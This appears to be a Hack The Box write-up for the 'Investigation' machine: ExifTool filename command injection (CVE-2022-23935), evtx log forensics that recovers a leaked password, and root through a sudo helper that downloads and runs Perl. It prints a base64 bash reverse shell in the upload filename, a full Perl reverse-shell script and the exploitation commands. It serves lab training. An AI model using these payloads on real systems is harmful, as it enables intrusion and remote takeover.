---
layout: post
title: "HTB: Investigation"
subtitle: "ExifTool 12.37 filename command injection (CVE-2022-23935), a Windows event-log DFIR pivot for smorton's password, then a root curl-and-perl helper"
date: 2023-04-12
tags: [htb, linux, exiftool, cve-2022-23935, dfir, evtx, privesc]
category: writeups
kind: machine
os: Linux
tldr: "eForenzics runs uploaded images through ExifTool 12.37, vulnerable to CVE-2022-23935. A filename ending in a pipe is executed as a command, so an upload named with a base64 bash reverse shell lands code execution as www-data. User comes from a forensic detour: a .msg on the box carries a security.evtx whose failed-logon records hold a password someone typed into the username field, which is smorton's SSH password. Root is a helper that only runs as root, downloads a script over HTTP with curl, and runs it through perl after setuid(0)."
---

## the box

Investigation is a Linux box at `10.10.11.197` with two ports open, `22` and `80`. The whole chain starts at the upload form on `80`. A site runs customer images through ExifTool and hands back the metadata report, the ExifTool build is old enough to be command-injectable, and that is the foothold. User is not a second service, it is a forensics problem: a mail file left on the box carries a Windows event log, and one of the failed logons in it leaks a password. Root is a small C helper that downloads a script and runs it as root.

tun0 was `10.10.16.19` throughout.

## recon

A full port sweep returned `22` and `80`. Directory brute forcing the web root found an `/assets` path that redirected to a virtual host:

```
/assets   (Status: 301) [Size: 317] [--> http://eforenzics.htb/assets/]
```

So I added the vhost to `/etc/hosts`:

```
10.10.11.197  eforenzics.htb
```

The interesting page was `/service.html`. It takes an uploaded image and returns a metadata report. The report is plainly ExifTool output, and it prints its own version:

```
ExifTool Version Number         : 12.37
File Name                       : wallpaperforu-1920x1080.jpg
File Type                       : JPEG
MIME Type                       : image/jpeg
Image Size                      : 1920x1080
```

## foothold: ExifTool CVE-2022-23935

ExifTool 12.37 is vulnerable to **CVE-2022-23935**. ExifTool opens the file it processes through Perl, and a filename ending in a pipe (`|`) is handed to a shell as a command rather than treated as a path. The upload endpoint stores the image under the filename from the multipart request and then runs ExifTool against it, so the `filename` field in the upload is the injection point. Brandon Kreisel published a PoC for it (`github.com/BKreisel/CVE-2022-23935`).

I did it by hand. The multipart part carries a filename that decodes and runs a bash reverse shell, closed with a trailing pipe:

```
-----------------------------30258078453829928265923985148
Content-Disposition: form-data; name="image"; filename="echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83Nzc3IDA+JjEK' | base64 -d | bash |"
Content-Type: image/jpeg
```

The base64 is the callback:

```bash
$ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS83Nzc3IDA+JjEK' | base64 -d
# bash -i >& /dev/tcp/10.10.16.19/7777 0>&1
```

The base64 wrapper keeps the pipes and redirects out of the filename itself, where they would break the injection. With a listener on `7777`, submitting the upload ran the filename as a command and caught a shell as `www-data`.

Enumeration from that shell pointed at the investigation work on the box. linpeas flagged a group-writable path under an investigation directory, owned by the `www-data` group:

```
Group www-data:
/usr/local/investigation/analysed_log
```

That directory is where the next step lives.

## user: event-log forensics

Sitting on the box was a mail file, `Windows Event Logs for Analysis.msg`, an email from an `eforenzics.htb` address with a `security.evtx` attachment. I opened the `.msg` in a viewer (encryptomatic) and pulled the attachment out, then confirmed the zip just held the log:

```
Archive:  evtx-logs.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 15798272  2022-08-01 13:36   security.evtx
```

EVTX is binary, so I dumped it to XML with the python-evtx `evtx_dump.py`:

```bash
$ python3 evtx_dump.py security.evtx > dump
```

The log is one workstation, `eForenzics-DI`. The useful move is to look at the account names the logon events reference and find the one that does not belong. Counting `TargetUserName` across the dump:

```bash
$ grep -oP '<Data Name="TargetUserName">[^<]*</Data>' dump | sort | uniq -c | sort -rn
```

```
4280 <Data Name="TargetUserName">EFORENZICS-DI$</Data>
 135 <Data Name="TargetUserName">LJenkins</Data>
 130 <Data Name="TargetUserName">SMorton</Data>
  98 <Data Name="TargetUserName">SYSTEM</Data>
  86 <Data Name="TargetUserName">AAnderson</Data>
  ...
```

Most are the machine account, SYSTEM, and normal user names. One value is obviously not a username, it is a password, and it shows up twice:

```bash
$ grep -n 'Def@ultf0r3nz' dump
```

```
323321:<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
323347:<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
```

The surrounding records are a failed credential validation (`4776`) and a failed logon (`4625`), back to back, microseconds apart:

```xml
<EventID Qualifiers="">4625</EventID>
<TimeCreated SystemTime="2022-08-01 19:15:15.374769"></TimeCreated>
...
<Data Name="SubjectUserName">EFORENZICS-DI$</Data>
<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">7</Data>
```

`LogonType` 7 is a workstation unlock, and `SubStatus` `0xc0000064` is "user does not exist". Someone unlocking the box typed their password into the username field by mistake, so the failed event recorded the password in clear text. The box has an `smorton` account, and `SMorton` is the active interactive user in this log, so the string is smorton's password:

```
user: smorton
pass: Def@ultf0r3nz!csPa$$
```

Those worked over SSH:

```bash
$ ssh smorton@10.10.11.197
# Def@ultf0r3nz!csPa$$
```

smorton held the user flag.

## root

smorton can run a root-owned helper binary as root. It is a small dynamically linked ELF against `libcurl-gnutls`, not stripped, so the disassembly reads cleanly. The logic of `main` reduces to:

```c
if (argc != 3)              { puts("Exiting... "); exit(0); }
if (getuid() != 0)          { puts("Exiting... "); exit(0); }
if (strcmp(argv[2], "lDnxUysaQn")) { puts("Exiting... "); exit(0); }

puts("Running... ");
FILE *f = fopen(argv[2], "wb");          // opens ./lDnxUysaQn
CURL *c = curl_easy_init();
curl_easy_setopt(c, CURLOPT_URL, argv[1]);
curl_easy_setopt(c, CURLOPT_WRITEDATA, f);
curl_easy_setopt(c, CURLOPT_FAILONERROR, 1);
if (curl_easy_perform(c)) { puts("Exiting... "); }
else {
    char *cmd = /* snprintf "perl ./%s", argv[2] */ "perl ./lDnxUysaQn";
    fclose(f);
    curl_easy_cleanup(c);
    setuid(0);
    system(cmd);                 // perl ./lDnxUysaQn
    system("rm -f ./lDnxUysaQn");
}
```

Three gates: exactly two arguments, a real uid of 0, and a second argument that matches the hardcoded string `lDnxUysaQn`. The `getuid()` check is why this is run through sudo as root rather than directly. Given those, it curls `argv[1]` into a file named `lDnxUysaQn` in the current directory, then runs `perl ./lDnxUysaQn` as root and deletes it. The relevant strings are right there in the binary:

```
lDnxUysaQn
perl ./%s
rm -f ./lDnxUysaQn
```

So the URL it downloads is attacker-controlled and the downloaded content is executed as root by Perl. I hosted a Perl reverse shell:

```perl
use Socket;
$i="10.10.16.19";
$p=7777;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
 open(STDIN,">&S");open(STDOUT,">&S");
 open(STDERR,">&S");exec("/bin/bash -i");
};
```

Then, from a writable directory so the helper can drop and run `./lDnxUysaQn`, I called it as root with my URL and the magic string:

```bash
$ cd /tmp
$ sudo /path/to/binary http://10.10.16.19/shell.pl lDnxUysaQn
# Running...
```

It fetched `shell.pl`, ran it through Perl with root privileges, and the listener on `7777` caught a root shell. The root flag was read and submitted from there.

## takeaway

The foothold is an old ExifTool reachable through a filename the user controls. The trailing pipe is the whole trick, and base64-wrapping the payload keeps the shell metacharacters out of the filename where they would break it. The user step is the one worth sitting with: a single failed logon recorded a password because the person typed it into the username box, and the whole pivot is recognizing the one `TargetUserName` that is not a name. Root is a helper that trusts a URL it downloads and runs as root, with a hardcoded string standing in for any real authentication.